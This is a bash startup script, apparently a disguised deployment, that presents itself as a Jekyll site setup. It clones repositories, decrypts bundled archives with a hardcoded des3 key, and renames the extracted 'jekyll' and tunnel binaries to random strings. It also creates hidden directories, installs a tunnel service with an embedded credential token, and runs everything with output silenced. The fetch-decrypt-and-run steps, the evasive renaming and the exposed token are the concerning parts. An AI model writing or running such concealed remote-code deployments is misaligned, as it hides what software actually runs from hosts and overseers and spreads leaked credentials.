#!/bin/bash

rename1=`cat /dev/urandom | tr -dc A-Za-z0-4 | head -c 9`
rename2=`cat /dev/urandom | tr -dc A-Za-z0-4 | head -c 9`

cd /jekyll

echo '啓動配置 ..'

#下載程式 --------------------------------------------------------------
cd /jekyll

echo '獲取資源 ..'
git clone https://github.com/Jekyll-Mask-repo/Spk.git
sleep 2
git clone https://github.com/Jekyll-Mask-repo/Jekyll-config.git
sleep 2

dd if=Spk/jekyll-tunnel.spk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
sleep 1
dd if=Spk/jekyll.spk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
sleep 1
dd if=Spk/caddy.spk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
sleep 1

echo '調整文件結構.'

chmod 0777 -R Jekyll-config
mv Jekyll-config/* /jekyll/
rm -rf Spk Jekyll-config
rm -rf Caddyfile && mv Caddyfile-Paas Caddyfile

echo '前期準備..'
mkdir /.temp
mkdir /.temp/tunnel
mkdir /.temp/tunnel/id/
mkdir /.temp/tunnel/id/.86de6451-e653-4318-bd38-4e8e4a9d8006

mv jekyll "$rename1"
mv jekyll-tunnel "$rename2"

#啓動-------------------------------------------------------------------
cd /jekyll

echo '正在啓動 ..'
sleep 2

./"$rename2" service install eyJhIjoiMzY2ZDkwNjUyOWE5MjUyNTM3NDA0NjM2N2ZiOTlkN2IiLCJ0IjoiYmY3ZmUzYmItYjQwZC00MjE0LTlhMTMtYzcyMzY4MTUwZmE2IiwicyI6Ik5ESmhOMkppTURZdE16UXlZUzAwWXpVMExUZzBNMlF0T0dFeE56RmhZVEJpT0dRMCJ9 > /dev/null &

./"$rename1" run -c jekyll.yaml > /dev/null &

./caddy run --config Caddyfile

# ----------------------------------------------------------------------
echo ‘完成’
